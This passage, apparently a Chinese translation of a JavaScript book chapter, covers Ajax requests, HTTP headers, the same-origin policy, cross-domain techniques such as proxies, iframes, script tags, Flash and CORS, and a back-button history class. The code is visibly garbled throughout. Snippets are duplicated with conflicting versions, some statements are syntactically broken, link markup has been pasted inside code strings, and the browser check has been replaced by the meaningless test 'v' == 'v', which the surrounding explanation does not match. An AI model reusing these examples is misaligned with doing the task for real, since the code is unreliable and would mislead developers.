  \n```javascript\nfunction keyValuePair(key, value) {\n    return encodeURIComponent(key)\
  \ + \"=\" + encodeURIComponent(value);\n}\n```\n\n```javascript\nxhr.send(keyValuePair(\"\
  hello\", \"world!\")&\" + keyValuePair(\"apple\", \"sauce\"));\n```\n\n注意我为 `bAsync`\
  \ 参数使用了 `true`。这意味着事务将是异步的，我将依赖我的 `onreadystatechange` 函数来处理响应。当 `readyState` ==\
  \ 4 时，你就知道 Ajax 请求已完成，通过查看 `status` 码你可以判断连接是否成功。在 `handleStatusChange()` 中，你想做的是检查\
  \ `readyState` 属性以查看连接处于哪个阶段。`readyState` 属性是一个整数，可以取以下值：\n* 0: 未初始化\n* 1: 加载中\n\
  * 2: 已加载\n* 3: 交互中\n* 4: 完成\n\n当然，你真正感兴趣的是 4：\n\n```javascript\nfunction handleStatusChange()\
  \ {\n    if (xhr.readyState == 4 && xhr.status == 200) {\n        // 传输完成！\n   \
  \     alert(\"Transfer complete!\\n\" + xhr.responseText);\n    }\n}\n```\n\n当 `readyState`\
  \ == 4 时，你知道 Ajax 请求已完成，通过查看 `status` 码可以判断连接是否成功。正常的成功码应该是 200。是一些常见的状态码：\n\n\n\
  \n\n```javascript\nfunction keyValuePair(key, value) {\n    return encodeURIComponent(key)\
  \ + \" = \" + encodeURIComponent(value);\n}\n\nmyXhr.send( keyValuePair(\"hello\"\
  , \"world!=&bla\") + \"&\" + keyValuePair(\"apple\", \"sauce\") );\n\nfunction handleStatusChange()\
  \ {\n    if (myXhr.readyState == 4) {\n        // Transfer is finished!\n      \
  \  alert(\"Transfer complete!\\n\\nContents:\\n\" + myXhr.responseText);\n    }\n\
  }\n```\n\n</script>\n\n</body\n\n</html>\n\n# 请求头和响应头\n\n当你从 Web 服务器请求文档时，你会获得以标头形式存在的一组键值对，以及文档本身。此标头包含了状态码、时间戳和内容类型等信息。要获取包含*所有*响应标的字符串，请使用\
  \ `getAllResponseHeaders()`。它将返回一个以换回符分隔每个标头的字符串。你可以看到如下示例输出：\n\nDate: Mon, 16 Mar\
  \ 2009 23:53:39 GMT\n\nEtag: \"4987b97a-e-860285\"\n\nLast-Modified: Tue, 03 Feb\
  \ 2009 03:26:50 GMT\n\nContent-Type: text/html\n\nContent-Length: 14\n\n要获取*特定*的标头值，请使用\
  \ `getResponseHeader()`，它接受一个包含你想要标头值字符串的参数。例如：`document.write( myXhr.getResponseHeader(\"\
  Etag\") );` // \"4987b97a-e-860285\"\n\n你也会作为请求的一部分传输一个标头。你可以使用 `setRequestHeader()`\
  \ 来控制这些值，它接受两个参数：`xhrObj.setRequestHeader(sHeader, sValue);`。例如，如果你想为表单提交目的设置内容类型，你可能需要使用\
  \ `application/x-www-form-urlencoded` 类型值：`myXhr.setRequestHeader(\"Content-Type\"\
  , \"application/x-www-form-urlencoded\");`。\n\n这些方法对标头值提供了大量的控制，但在正常情况下，通常没有必要对这些内容进行调整。\n\
  \n## 安全\n\n在第 17 章中，我讨论了*同源策略*，它限制了 JavaScript 跨域的通信。这同样适用于 `XMLHttpRequest` 对象。在源自\
  \ [`wrox.com`](http://wrox.com) 的文档中，你无法向 [`someothersite.com`](http://someothersite.com)\
  \ 甚至 [`browsewrox.com`](http://browsewrox.com) 发起 Ajax 请求，因为这将违反了该规则并触发安全异常。\n\n\
  另一个安全考虑因素是，Ajax 应用往往具有更大的*攻击面*，需要进行审计和安全保护。例如，你暴露的用于更改数据甚至查询数据库的每个 HTTP 服务，都是用户探测并插入恶意数据的机会，其试图访问数据或破坏数据。\n\
  \n## 使用 GET 请求更改数据\n\n开发者在将应用程序“Ajax 化”时遇到的一个常见问题是出现在他们编写用于更改数据的 HTTP 服务时。考虑以下示例：[`mysite.com/users/?action=delete&id=123`](http://mysite.com/users/?action=delete&id=123)\n\
  \n某些浏览器工具，如 Google 的 Web 加速器 ([`webaccelerator.google.com/`](http://webaccelerator.google.com/))\
  \ 会自动预加载页面上的所有 URL，以加快页面加载速度。如果你对可能更改数据的操作使用替代的 HTTP 动词，这个问题就会被消除。例如，你可以使用 `POST`\
  \ 或 `DELETE` 请求来代替 `GET` 请求。\n\n# 跨域 Ajax\n\n在第 17 章中，我引入了*同源策略*，它规定了 JavaScript\
  \ 应用程序如何与跨域的文档进行通信。Ajax 请求也受这些规则的限制，任何进行大量 Ajax 开发的人在日常使用中都会很快遇到同源限制。随着像 Flickr\
  \ API 和 Yahoo! Web Services 等公共 Web 服务的爆炸式增长，开发者们开始怀疑这种限制是否弊大于于利。\n\n同源策略的原始初衷意图之一是保护用户免受恶意脚本在他们不知情的情况下与第三方服务器通信的影响。然而，浏览器的其他功能抵消了这一点，让那些有决心的开发者能够绕过任何限制。\n\
  \n事实是，有很多正当理由想要进行跨源或跨域 Ajax 请求。这里只是其中几个：\n* 接入丰富的第三方数据库，如 Google Maps、Yahoo! Geo\
  \ APIs、字典和百科全书查询等。\n* 使用第三方 Web 分析工具。\n* 采用面向服务的架构，并将你的应用程序部分部分分布在多个网络上的多个源上。\n\n\
  无论你是否认为跨域 Ajax 是一个应该避免还是拥的做法，不可否认的是，能够跨域通信为内容和组件化的 JavaScript 特性开启了无限可能的世界。\n\n\
  ## 方法比较\n\n在本节中，我将讨论许多以类似于 Ajax 的方式（无需刷新浏览器）进行跨域通信的不同方法。为了让你预先了解每种方法的优点并帮助你缩小研究范围，这里有一张表格总结并比较了主流方法：![23]\n\
  \n## document.domain\n\n在源有多个子域（如 [`wrox.com`](http://wrox.com) 和 [www.wrox.com](http://www.wrox.com)）的情况下，正常情况下无法从其中一个向另一个执行\
  \ Ajax 请求，*除非*你将 `document.domain` 属性设置为当前主机。例如：`document.domain = \"wrox.com\"\
  ;`。这将允许子域之间的通信。\n\n## 代理\n\n运行在服务器上的代理脚本可以是向外部服务往返请求的有效手段。代理脚本通常是轻量且高效的。在 ![231]\
  \ 中，你可以看到代理如何在第三方服务和 `XMLHttpRequest` 之间建立接口。\n\n通常，使用代理脚本所需的仅仅是重写目标 URI，将预期的 URI\
  \ 作为参数传递：\n\n```javascript\nfunction proxyUrl(proxyLocation, intendedDestination){\n\
  \    return proxyLocation + \"?url=\" + encodeURIComponent(intendedDestination);\n\
  }\n\nmyXhr.open(\"get\", proxyUrl(\"proxy.php\", \"http://api.yahoo.com/geocode/?lat=334.42&long=34.232\"\
  ), true);\n```\n\n对于可以想象的每一个平台，有很多免费开源的代理脚本可以下载。这里只是几个：\n* PHPProxy: [`freshmeat.net/projects/phpproxy/`](http://freshmeat.net/projects/phpproxy/)\n\
  * ASProxy (ASP.NET): [`asproxy.sourceforge.net/`](http://asproxy.sourceforge.net/)\n\
  * Proxy Servlet: [`www.handle.net/proxy_servlet.html`](http://www.handle.net/proxy_servlet.html)\n\
  \n在使用这种方法时，需要记住的一点是它对你的 Web 服务器产生的额外影响。如果你为每个用户代理大量请求，并且流量很大，这可能会瘫痪你的机器。在选择这种方法之前，请确保你有足够的容量。\n\
  \n\n\n\n\n通过 iframe 的某些帮助，可以实现有限的跨域通信。尽管位于另一个域的 iframe 无法通过 JavaScript 访问其文档，但你\
  \ `can` 读取它的 URL。这看起来可能没大不了什么，但它是 iframe 文档和父窗口都可以更改和读取的内容，因此它是一个通信点。其工作原理如下：\n\n\
  *   父窗口在 iframe 中加载另一个域的、经过特殊准备的网页。\n*   iframe 文档加载（假设 URL 为 `[`mysite.com/page.htm`](http://mysite.com/page.htm)`）并立即设置片段标识符（fragment\
  \ identifier），以包含它想要通信给父窗口的信息。例如，`[`mysite.com/page.htm#someinformation`](http://mysite.com/page.htm#someinformation)`。\n\
  *   父窗口一直在监控 iframe 的 URL，查看片段标识符是否发生变化。当发生变化时，父窗口就会读取这些信息。\n*   搞定！跨域通信实现。\n\n\
  这种方法要求父窗口和子框架不断地轮询 URL。它还限制了往回传输的信息量，尽管如果需要，可以将信息拆分成许多块。\n\n它还有另一个不良的副作用。在大多数浏览器中，更改\
  \ iframe 的片段标识符会强制在父窗口的 `History` 对象中产生一条记录。当用户点击浏览器中的“后退”按钮时，会导致 iframe 发生变化而不是页面。\n\
  \n总来说，这是一种非常迂回的方法，而可以通过脚本注入或使用 Flash 更轻松地解决，我现在将将讨论这两者。\n\n## 图像注入 (Image Injection)\n\
  \n图像注入方法基本上涉及向 DOM 插入一个非常小的 `<IMG>` 标签，用于触发外部网络服务。与客户端通信是困难的，但某些实现通过更改返回图像的 `size`\
  \ 实现了这一点。你可以通过类似下面的操作来实现：\n\n```javascript\nvar newImg = new Image();\nnewImg.src\
  \ = ″[`mysite.com/fakeimg.gif`](http://mysite.com/fakeimg.gif)″;\nnewImg.onload\
  \ = function() {\n    alert(newImg.width+ ″,″ +newImg.height);\n}\n```\n\n## <SCRIPT>\
  \ 注入\n\n脚本注入与图像注入方法类似，基本上涉及向 DOM 插入 `<SCRIPT>` 标签。任何需要发送出的信息都作为参数放入查询字符串中：\n\n```html\n\
  <script type=″text/javascript″ src=″[`myservice.com/?data=somedatahere`](http://myservice.com/?data=somedatahere)″></script>\n\
  ```\n\n服务器的响应会被评估，因此输出的任何内容都必须是格式正确的 JavaScript。这意味着你必须盲地信任该脚本的提供者。这将通过脚本请求传输某些数据：\n\
  \n```javascript\nvar scriptTag = document.createElement(″script″);\nscriptTag.type\
  \ = ″text/javascript″;\nscriptTag.setAttribute(″src″,url + ″&data=″ + encodeURIComponent(data));\n\
  document.body.appendChild(scriptTag);\n```\n\n## Flash 方案 (The Flash Approach)\n\
  \n目前最灵活的跨域通信可能是使用 Flash 。不仅如此，在 ActionScript 3 中，有一种方法可以使用 `GZIP` 压缩所有传出的数据，使得快速地往回传输大量二进制信息成为可能。它是使用\
  \ `Action Message Format` (`AMF`) 实现的。如果你走这条路线，在服务器上你需要使用能够解码 AMF 消息的库，例如 BlazeDS\
  \ `[`opensource.adobe.com/wiki/display/blazeds/BlazeDS/`](http://opensource.adobe.com/wiki/display/blazeds/BlazeDS/)`\
  \ 或 AMFPHP `[www.amfphp.org](http://www.amfphp.org)`。它们都是免费开源库。\n\n不过，你不必使用 AMF。你可以以未编码文本的形式传输数据，就像通过\
  \ Ajax Post 一样。然而，Adobe 控制此用途的方法是强制使用一个名为 `crossdomain.xml` 的权限文件，该文件必须位于你连接的服务器的\
  \ `root` 。例如，如果你连接到 `[`mysite.com/mydir/myurl.php`](http://mysite.com/mydir/myurl.php)`\
  \ 的 URL 且跨跨域，Flash 电影将首先尝试下载 `[`mysite.com/crossdomain.xml`](http://mysite.com/crossdomain.xml)`\
  \ 文件。在你的 XML 文件中，你可以为不同的域划分特定的权限，或者如果你像 YouTube 一样希望每个人都能访问你的网络服务，你可以这样做：\n\n```xml\n\
  <?xml version=″1.0″?>\n<!DOCTYPE cross-domain-policy SYSTEM ″ [`www.macromedia.com/xml/dtds/cross-domain-policy.dtd`](http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd)″>\n\
  <cross-domain-policy>\n    <allow-access-fromdomain=″*″ />\n</cross-domain-policy>\n\
  ```\n\n它允许所有人访问。一旦设置好此文件，你就可以使用名为 `URLLoader` 的库创建一个新的 Flash 电影，当然还有用于与 JavaScript\
  \ 通信的 `ExternalInterface`。将在第 23 章详细讨论 `ExternalInterface`。以下是一个 AS3 脚本，它暴露了一个单方法\
  \ (`LoadURL()`) 用来向页面上的任意页面发送数据：\n\n```actionscript\nimport flash.display.Sprite;\n\
  import flash.external.ExternalInterface;\nimport flash.events.*;\nimport flash.net.*;\n\
  \nfunction LoadURL(url,postvars):void {\n    var loader:URLLoader = newURLLoader();\n\
  \    loader.addEventListener(Event.COMPLETE, completeHandler);\n    var request:URLRequest\
  \ = newURLRequest(url);\n    request.data = postvars;\n    loader.load(request);\n\
  }\n\nfunction completeHandler(event:Event) : void {\n    var loader:URLLoader=URLLoader(event.target);\n\
  \    var vars:URLVariables = newURLVariables(loader.data);\n    ExternalInterface.call(″FlashXRespond″,\
  \ vars.answer);\n}\n\nflash.system.Security.allowDomain(″*″);\nExternalInterface.addCallback(″LoadURL″,\
  \ LoadURL);\n```\n\n当服务响应时，`completeHandler()` 将触发并调用 JavaScript 函数 `FlashXRespond()`，并带有一个包含请求输出的参数。使用第\
  \ 18 章的 `getMovie()` 函数，你可以在 JavaScript 中这样做：\n\n```javascript\ngetMovie(′xhr′).LoadURL(″http://mysite.com/somepath/page.php](http://mysite.com/somepath/page.php)″,″\
  \ )\n```\n\n为了处理响应，你只需要确保 `FlashXRespond()` 准备好处理结果：\n\n```javascript\nfunction\
  \ FlashXRespond(res){\n    alert(res);\n}\n```\n\n## 跨域 XMLHttpRequest (Cross-Domain\
  \ XMLHttpRequest)\n\nW3C 目前正在尝试标准化一种用于跨域（或 `cross-site`）通信的 XMLHttpRequest，它基于浏览器中已有的功能。它的工作原理将如下：如果网络服务作者在\
  \ `[`coolapi.com/geo/`](http://coolapi.com/geo/)` 有一个资源输出字符串 `lat:3213.23,long:2132.21`，并且\
  \ `[`mysite.com/`](http://mysite.com/)` 有一个文档请求它，该服务将响应头部 `Access-Control-Allow-Origin:Access-Control-Allow-Origin:\
  \ [http://mysite.com]`\n\n通过 Ajax 请求文档的方法不需要改变：\n\n```javascript\nvar xhr = new\
  \ XMLHttpRequest ( );\nxhr.open(″GET″, ″[`coolapi.com/geo/`](http://coolapi.com/geo/)″);\n\
  xhr.send(null);\n```\n\n但对于没有实现此特定头部的站点，跨域通信仍然是不可能的。目前，Firefox 3.5 计划包含此功能，其他浏览器也将随其后。尽管如此，你不应期望该功能在未来几年内成为一个广泛支持的功能。\n\
  \n\n\n\n\n随着 Ajax 变得越来越流行，开发者在应用程序中赋予了它更大的角色。用户在体验改进后首先注意到的事情是，浏览器的“后退”和“前进”按钮不再按预期工作。点击后退按钮不会撤销对\
  \ DOM 的更改，也不应该这样做。然而，用户已经习惯于将后退按钮作为一种“撤销”功能。如果你的整个应用程序破坏了这一功能，当用户无意间点击后退按钮时，他们会被带回登录页面或之前的页面。图\
  \ 19-3 说明了这个问题。图 19-3![233](img/whit_9780470550502_oeb_233_r1.gif)\n\n另一个相关问题是用户无法收藏使用大量\
  \ Ajax 请求构建的页面。浏览器没有方法精确地表示该页面的状态并让用户返回。至少，在没有帮助的情况下做不到的。\n\n解决这个问题有两种方法。最简单的是节制地使用\
  \ Ajax，仅用于微小的页面更新，并对主导航使用传统方法。\n\n一个更好但更复杂的解决方案是使用所谓的 **iframe 方法**，来跟踪状态变化，并根据你设计的某些哈希（hash）或符号来重建页面。例如，假设你有一个页面包含一个\
  \ Ajax 内容区域；将该内容区域命名为 `myAjaxArea`。如果你将 `data.txt` 的内容加载到 `myAjaxArea`，你可能将页面的状态表示为\
  \ \"myAjaxArea=data.txt\" 或类似的内容。稍后，当你发现页面“状态”已变为 `myAjaxArea=somethingelse.txt`\
  \ 时，你就知道该时候用 `somethingelse.txt` 的内容重新加载 `myAjaxArea` 了。这只是跟踪页面状态的一种方法。具体如何实现取决于个人喜好。困难的部分是让浏览器在用户使用后退和前进按钮时向你提供相关信息。\n\
  \n### Iframe 方法\n\niframe 方法实际上是两种方法的结合。在大多数浏览器中（包括基于 Mozilla 的浏览器、较新的 Safari 和\
  \ Opera）中，当你更改文档的片段标识符（[`mysite.com/bla/#somefragment`](http://mysite.com/bla/#somefragment)\
  \ 中 \"#\" 后的部分）时，对于浏览器的 `History` 对象来说，会被记录为一个页面。当用户点击后退或前进按钮时，这些片段标识符会循环切换。这是在页面实际重新加载的情况下发生的。这是后退按钮修复的关键：当用户点击后退按钮时，页面本身不能重新加载。\n\
  \n在 Internet Explorer 8 之前的版本中并非如此。片段标识符的更改不会影响历史记录或后退前进按钮。相反，你必须使用 iframe 并强制它加载新文档，以便让页面更改被记录为历史记录中的一项。遗憾的是，这种技术在我提到的其他浏览器中不起作用，因此你必须同时使用两种方法。不过这没关系，因为这样做不会给脚本增加很多额外复杂度。\n\
  \n### 实现 HistoryObject\n\n我将构建一个简单的类，用于使用这两种方法控制进入历史对象的条目。这个类我将称为 `HistoryObject`，它将具有以下功能：\n\
  \n- 在类的构造函数中，我将插入一个 iframe 并指向一个本地脚本（我也必须编写该脚本）。此框架将是文档的一部分但不可见。\n- 我将创建一个定时器来持续轮询\
  \ `window.location.hash` 标识符以检查它是否发生变化。这适用于 Internet Explorer 以外的浏览器。\n- 在定时器中，我还将检查\
  \ iframe 中加载了哪个页面。这比起来要复杂，我稍后会解释。\n- 当这两个值的任何一个发生变化时，我会触发一个事件并调用用户定义的函数。\n- 类将有一个方法用于设置页面哈希，以便在\
  \ Ajax 更新后使用。这将导致 `window.location.hash` 标识符改变，iframe URL 也随之改变，从而在历史对象中插入一个事件。\n\
  \n我将从为我的类定义一个构造函数开始。这个构造函数接受两个参数：一个用于存储在 iframe 中的脚本，另一个用于用户点击后退或前进按钮（或加载已带有片段标识符的页面）时执行的回调函数：\n\
  \n```javascript\nvar HistoryObject = function(url, callbackFn){\n\n  // 创建自己的引用\n\
  \  var that = this;\n\n  // 设置回调函数\n  this.callbackFn = callbackFn;\n\n  // 指明 iframe\
  \ URL 的位置\n  this.frameUrl = url;\n}\n```\n\n在第一部分中，我还记录了两个参数，并创建了一个以后使用的自引用。接下来，我需要检测是否正在使用\
  \ Internet Explorer，如果是，则创建 iframe：\n\n```javascript\n// 创建 iframe\nif ('v' == 'v')\
  \ {\n  this.iframeObj = document.createElement(\"iframe\");\n  this.iframeObj.src\
  \ = url + \"?state=\";\n  .iframeObj.style.display = \"block\";\n  document.body.appendChild(this.iframeObj);\n\
  }\n```\n\n在这里我还为 iframe 的源设置了一个初始值，包含 `state=`，这是我跟踪哈希的方式。接下来，我将定义一个函数，定期检查 `.location.hash`\
  \ 和 iframe 的 URL。如果用户点击后退按钮，此函数应该察觉并调用用户的函数。\n\n```javascript\nthis.checkHash =\
  \ function() {\n  var stateHash;\n  if ('v' == 'v') {\n    stateHash = that.iframeObj.contentWindow.bbhash;\n\
  \    window.location.hash = stateHash; // 用于 IE\n  } else {\n    stateHash = window.location.hash.replace(\"\
  #\", \"\");\n    stateHash = decodeURIComponent(stateHash);\n    if (that.currentStateHash\
  \ != stateHash) {\n      that.currentStateHash = stateHash;\n      that.callbackFn(that);\n\
  \    }\n  }\n  that.hashTimer = setTimeout(that.checkHash, 250);\n};\n```\n\n\n\n\
  \n对于非 Explorer 浏览器，这会将 `window.location.hash` 设置为 `stateHash`。在 IE 中，它会将 iframe\
  \ 的 URL 设置为包含状态变量的 `stateHash`。这会导致 iframe 的完全重新加载，并在历史对象（history object）中正确记录。\n\
  \n现在，让我们用我创建的类来进行测试运行。为了简单起见，我将仅模拟执行一个 Ajax 请求。这里的重点是展示 `HistoryObject()` 是如何工作的。我将首先创建一个回调函数来处理点击后退按钮的操作：\n\
  \n```javascript\nfunction HistoryCallbackFunction() {\n    alert(\"Restoring state\
  \ to \" + this.currentStateHash);\n    // 根据此哈希值恢复页面\n}\n```\n\n回到 `checkHash()`，当我在历史发生变化时调用用户定义的脚本时，我将\
  \ `this` 属性设置为等于 `HistoryObject` 实例。这样，在用户定义的函数中只需通过引用 `this` 就可以轻松访问该实例的成员。该函数将会在屏幕上弹出新的哈希值。这就是我如何根据该哈希值来重构页面。\n\
  \n接下来我将创建一个 `HistoryObject` 实例：\n`var ho = new HistoryObject(\"history.php\", HistoryCallbackFunction);`\n\
  \n现在我将编写一个小函数来执行模拟 Ajax 请求并将项目插入历史记录：\n\n```javascript\nfunction doAjaxRequest()\
  \ {\n    ho.InsertHistory(\"ajaxarea1=content1\");\n    // 在此处执行 ajax 请求\n    return\
  \ false;\n}\n```\n\n剩下的唯一工作就是为页面配置一个按钮，以执行这个模拟的 Ajax 请求：\n`<button onclick=\"doAjaxRequest();\"\
  >执行 Ajax 请求并添加历史项</button>`\n\n有许多免费的开源库可以实现与你刚刚阅读的内容相似的功能。一个非常流行的库是 Brad Neuberg\
  \ 的 Really Simple History（[`code.google.com/p/reallysimplehistory/`](http://code.google.com/p/reallysimplehistory/)）。\n\
  \n这里再次是完整的示例：\n\n```html\n<head>\n    <title>Backbutton and bookmarking script</title>\n\
